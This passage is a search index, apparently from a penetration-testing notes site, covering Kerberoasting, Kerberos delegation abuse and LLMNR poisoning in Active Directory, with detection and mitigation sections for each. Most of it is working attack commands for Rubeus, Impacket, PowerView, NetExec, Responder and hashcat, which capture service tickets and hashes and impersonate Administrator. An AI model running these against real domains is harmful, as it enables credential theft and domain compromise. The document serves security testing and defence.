<p>Weak Encryption: Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (<code>-rc4opsec</code>). While this makes cracking easier, requesting a ticket with encryption type <code>0x17</code> (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.</p> </li> <li> <p>Honeypots: Defenders can create fake service accounts with tempting SPNs (e.g., <code>sql_prod_admin_svc</code>) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#requesting-a-ticket","title":"Requesting a ticket","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#powerviewps1","title":"PowerView.ps1","text":"<p>Identify kerberoastable users</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainUser * -spn | select samaccountname\n</code></pre> <p>Request ticket</p> <pre><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre> <pre><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#rubeus","title":"Rubeus","text":"<p>Get information about kerberoastable users</p> <pre><code>.\\Rubeus.exe kerberoast /stats\n</code></pre> <p>Kerberoast all users</p> <pre><code>.\\Rubeus.exe kerberoast \n</code></pre> <p>Useful flags:</p> <ul> <li><code>/outfile</code> outputs roasted hashes to the specified file, one per line.</li> <li><code>/tgtdeleg</code> accounts with AES enabled in <code>msDS-SupportedEncryptionTypes</code> will have RC4 tickets requested. (Doesn't work on &gt;= Win 2019)</li> <li><code>/rc4opsec</code> tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</li> <li><code>/simple</code> output tickets one per line in the terminal</li> <li><code>/nowrap</code> don't wrap new lines and output to terminal</li> <li><code>/user:&lt;DomainUser&gt;</code> specify user to kerberoast</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#impacket","title":"Impacket","text":"<p>Kerberoast all users</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request -dc-ip &lt;dcip&gt;\n</code></pre> <p>Kerberoast specific user</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request-user &lt;user&gt; -dc-ip &lt;dcip&gt;\n</code></pre> <p>Useful flags:</p> <ul> <li><code>-outputfile</code> send output to file</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#netexec","title":"NetExec","text":"<pre><code>nxc ldap &lt;IP&gt; -u 'user' -p '' --kerberoasting &lt;OUTFILE&gt;\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#powershell-mimikatz","title":"PowerShell + Mimikatz","text":"<p>Identify kerberoastable users.</p> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>setspn.exe -Q */*\n</code></pre> <pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.domain.local:1433\"\n</code></pre> <pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list \n</code></pre> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n\n</code></pre> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <pre><code>python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#cracking-a-ticket","title":"Cracking a ticket","text":"Encryption Type (etype) Name / Algorithm Hashcat Mode Notes / Where Seen <code>23</code> RC4-HMAC (arcfour-hmac-md5) 13100 Default for older AD, common in Kerberoasting. Weak, fastest to crack. <code>17</code> AES128-CTS-HMAC-SHA1-96 19600 Seen when RC4 is disabled; newer/modern service accounts. <code>18</code> AES256-CTS-HMAC-SHA1-96 19700 Stronger; common when \"AES only\" enforced. <code>3</code> DES-CBC-MD5 Obsolete (no current Hashcat mode) Legacy, should be disabled. <code>RC4-HMAC-OLD</code> / <code>etype 24</code> RC4-HMAC with old salt usage (rare) Use 13100 Rare edge cases, still cracks with RC4 mode. [[hash_cracking]]","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>None</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#detection","title":"Detection","text":"<ul> <li> <p>Event ID 4769: A Kerberos service ticket was requested</p> </li> <li> <p>Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare</p> </li> <li> <p>Requests for service tickets from unusual workstations or for accounts that rarely see this activity.</p> </li> <li> <p>LDAP queries that search for accounts with an SPN like <code>(servicePrincipalName=*)</code></p> </li> <li> <p>Create a honey account and make a custom alert for tickets requested for that account</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: This is the most effective mitigation. Enforce a strong password policy for service accounts</p> </li> <li> <p>Use Group Managed Service Accounts: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory</p> </li> <li> <p>Protected Users Group: Add high-value accounts (including service accounts where possible) to the \"Protected Users\" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberos_delegation/","title":"Kerberos delegation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#technique","title":"Technique","text":"<p>Kerberos Delegation is a feature in Active Directory that allows service accounts to impersonate users when accessing other services. While this feature is designed for legitimate scenarios where a service needs to access resources on behalf of a user, it can be abused by attackers for privilege escalation and lateral movement.</p> <p>There are three main types of Kerberos delegation:</p> <ol> <li>Unconstrained Delegation: Allows a service to impersonate a user to any service on any computer.</li> <li>Constrained Delegation: Restricts impersonation to specific services on specific computers.</li> <li>Resource-Based Constrained Delegation (RBCD): Allows the resource (rather than the impersonating service) to define which services can impersonate users to it.</li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Varies by attack type, but generally requires some level of authenticated access to the domain.</p> <p>System State: The target environment must be using Kerberos authentication with delegation configured.</p> <p>Information: Knowledge of delegation configurations in the domain.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#unconstrained-delegation","title":"Unconstrained Delegation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#identification","title":"Identification","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#from-linux-remote","title":"From Linux (Remote):","text":"<pre><code>nxc ldap 192.168.0.104 -u username -p password --trusted-for-delegation\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#from-windows-local","title":"From Windows (Local):","text":"<pre><code># Using ADSearch\nADSearch.exe --search \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname\n\n# Using PowerShell\nGet-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description\n</code></pre> <p>Note: Domain Controllers are always configured for unconstrained delegation by default.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#exploitation","title":"Exploitation","text":"<p>The attack works by: 1. Monitoring for TGT tickets on a system with unconstrained delegation 2. Forcing a domain controller or privileged user to authenticate to that system 3. Stealing the forwarded TGT and using it to impersonate the user</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#monitor-for-tickets-with-rubeus","title":"Monitor for Tickets with Rubeus:","text":"<pre><code>Rubeus.exe monitor /interval:10 /nowrap\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#force-authentication","title":"Force Authentication:","text":"<p>Use various authentication coercion techniques like: - PrinterBug (MS-RPRN) - PetitPotam (MS-EFSRPC) - ShadowCoerce (MS-FSRVP)</p> <p>Example using SharpSpoolTrigger: <pre><code>SharpSpoolTrigger.exe dc01.lab.local web.dev.lab.local\n</code></pre> Where: - DC01 is the \"target\" (domain controller we want to authenticate) - WEB is the \"listener\" (our compromised server with unconstrained delegation)</p> <p>Rubeus should capture the TGT of the authenticating computer account, which can then be used for impersonation.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#constrained-delegation","title":"Constrained Delegation","text":"<p>Constrained delegation uses two extensions to the Kerberos protocol: - S4U2Self (Service for User to Self) - S4U2Proxy (Service for User to Proxy)</p> <p>These allow a service to request tickets on behalf of a user, but only to specific service SPNs configured via the <code>msDS-AllowedToDelegateTo</code> attribute.</p> <p>More details: [[service_for_user_to_self|S4U2Self]]</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#identification_1","title":"Identification","text":"<pre><code># Using NetExec\nnxc ldap 192.168.0.104 -u username -p password --trusted-for-delegation --delegate-from\n\n# Using PowerShell\nGet-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#exploitation_1","title":"Exploitation","text":"<p>If you have credentials for an account configured with constrained delegation:</p> <pre><code># Using Rubeus\nRubeus.exe s4u /user:serviceaccount$ /rc4:serviceaccount_ntlm_hash /impersonateuser:Administrator /domain:domain.local /msdsspn:cifs/targetserver.domain.local /ptt\n\n# Using Impacket\nimpacket-getST -spn cifs/targetserver.domain.local -impersonate Administrator -dc-ip 192.168.0.100 domain.local/serviceaccount:password\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#resource-based-constrained-delegation-rbcd","title":"Resource-Based Constrained Delegation (RBCD)","text":"<p>RBCD allows a resource to specify which accounts can delegate to it, using the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#exploitation_2","title":"Exploitation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#using-netexec","title":"Using NetExec:","text":"<pre><code># If msDS-AllowedToActOnBehalfOfOtherIdentity is already set\nnxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#using-impacket","title":"Using Impacket:","text":"<ol> <li> <p>Create a computer account we control: <pre><code>impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Password123!' -dc-ip 192.168.0.100 domain.local/username:password\n</code></pre></p> </li> <li> <p>Configure delegation rights: <pre><code>impacket-rbcd -delegate-to 'TargetServer$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write domain.local/username:password\n</code></pre></p> </li> <li> <p>Request ticket for admin: <pre><code>impacket-getST -spn cifs/targetserver.domain.local -impersonate Administrator -dc-ip 192.168.0.100 domain.local/rbcd-test$:Password123!\n</code></pre></p> </li> <li> <p>Use the ticket: <pre><code>export KRB5CCNAME=Administrator@cifs_targetserver.domain.local@DOMAIN.LOCAL.ccache\nimpacket-psexec Administrator@targetserver.domain.local -k -no-pass -dc-ip 192.168.0.100\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#using-powershellrubeus","title":"Using PowerShell/Rubeus:","text":"<ol> <li> <p>Create a machine account: <pre><code># Using PowerMad\nNew-MachineAccount -MachineAccount rbcd-comp -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)\n</code></pre></p> </li> <li> <p>Configure delegation rights: <pre><code># Using built-in AD module\nSet-ADComputer targetserver -PrincipalsAllowedToDelegateToAccount rbcd-comp$\n</code></pre></p> </li> <li> <p>Get hash and request ticket: <pre><code># Get hash\nRubeus.exe hash /password:Password123! /user:rbcd-comp$ /domain:domain.local\n\n# S4U request\nRubeus.exe s4u /user:rbcd-comp$ /rc4:hash_from_above /domain:domain.local /msdsspn:cifs/targetserver /impersonateuser:administrator /ptt\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#using-delegations-tool","title":"Using Delegations Tool","text":"<p>The Delegations tool is a specialized utility for working with all types of Kerberos delegations in Active Directory environments. It provides comprehensive capabilities for auditing, adding, finding, clearing, and removing delegation configurations.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#installation","title":"Installation","text":"<pre><code># Install using Go\ngo install github.com/TheManticoreProject/Delegations@latest\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#audit-mode","title":"Audit Mode","text":"<p>Identify all delegation configurations in the domain:</p> <pre><code>./Delegations audit --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#find-mode","title":"Find Mode","text":"<p>Identify specific delegation types:</p> <pre><code># Find unconstrained delegations\n./Delegations find unconstrained --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Find constrained delegations\n./Delegations find constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Find RBCD configurations\n./Delegations find rbcd --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#add-delegations","title":"Add Delegations","text":"<pre><code># Add constrained delegation\n./Delegations add constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \\\n    --allowed-to-delegate-to \"CIFS/server.domain.local\"\n\n# Add constrained delegation with protocol transition\n./Delegations add constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \\\n    --allowed-to-delegate-to \"CIFS/server.domain.local\" --with-protocol-transition\n\n# Add unconstrained delegation\n./Delegations add unconstrained --distinguished-name \"CN=ServerAccount,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Add RBCD\n./Delegations add rbcd --distinguished-name \"CN=TargetServer,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \\\n    --allowed-to-act-on-behalf-of-another-identity \"AttackerAccount$\"\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#remove-delegations","title":"Remove Delegations","text":"<pre><code># Remove specific constrained delegation\n./Delegations remove constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \\\n    --allowed-to-delegate-to \"CIFS/server.domain.local\"\n\n# Remove unconstrained delegation\n./Delegations remove unconstrained --distinguished-name \"CN=ServerAccount,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Remove RBCD\n./Delegations remove rbcd --distinguished-name \"CN=TargetServer,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \\\n    --allowed-to-act-on-behalf-of-another-identity \"AttackerAccount$\"\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#clear-all-delegations","title":"Clear All Delegations","text":"<pre><code># Clear all constrained delegations\n./Delegations clear constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Clear all constrained delegations with protocol transition\n./Delegations clear constrained --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' --with-protocol-transition\n\n# Clear unconstrained delegation\n./Delegations clear unconstrained --distinguished-name \"CN=ServerAccount,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Clear all RBCD\n./Delegations clear rbcd --distinguished-name \"CN=TargetServer,CN=Computers,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#protocol-transition-management","title":"Protocol Transition Management","text":"<pre><code># Add protocol transition\n./Delegations add protocoltransition --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n\n# Remove protocol transition\n./Delegations remove protocoltransition --distinguished-name \"CN=ServiceAccount,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#monitor-mode","title":"Monitor Mode","text":"<pre><code># Monitor for delegation changes in real-time\n./Delegations monitor --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#detection","title":"Detection","text":"<ul> <li>Monitor for modifications to delegation-related attributes:</li> <li><code>UserAccountControl</code> (Unconstrained Delegation)</li> <li><code>msDS-AllowedToDelegateTo</code> (Constrained Delegation)</li> <li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (RBCD)</li> <li>Watch for S4U2Self and S4U2Proxy ticket requests</li> <li>Monitor for TGT ticket exports using tools like Rubeus</li> <li>Use the Delegations tool's monitor mode to detect real-time changes to delegation configurations</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/kerberos_delegation/#mitigation","title":"Mitigation","text":"<ul> <li>Limit the number of accounts configured for delegation</li> <li>Use constrained delegation instead of unconstrained when necessary</li> <li>Mark sensitive accounts as \"sensitive and cannot be delegated\"</li> <li>Add privileged accounts to the Protected Users group</li> <li>Monitor and restrict the ability to create computer accounts</li> <li>Implement tiered administration model</li> <li>Regularly audit delegation configurations using tools like Delegations</li> <li>Remove unnecessary delegation privileges</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/llmnr_poisoning/","title":"Llmnr poisoning","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#technique","title":"Technique","text":"<p>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning are attack techniques that target Windows name resolution fallback mechanisms. When a Windows system can't resolve a hostname using DNS, it falls back to these broadcast-based protocols. An attacker on the same network can respond to these broadcast requests, impersonating the requested resource and capturing authentication hashes.</p> <p>This technique allows attackers to collect Net-NTLMv2 hashes that can be cracked offline or potentially relayed to authenticate to other services.</p>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to the target environment (same broadcast domain)</p> <p>System State: Tr arget Windows systems with LLMNR and/oNBT-NS enabled (default in most Windows environments)</p> <p>Tools: Responder (Linux) or Inveigh (Windows)</p>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#from-linux-using-responder","title":"From Linux Using Responder","text":"<ol> <li> <p>Start Responder and listen for LLMNR/NBT-NS requests: <pre><code>sudo responder -I eth0\n</code></pre></p> </li> <li> <p>Wait for authentication hashes to come in as systems attempt to resolve hostnames</p> </li> <li> <p>Crack the captured Net-NTLMv2 hashes: <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#from-windows-using-inveigh","title":"From Windows Using 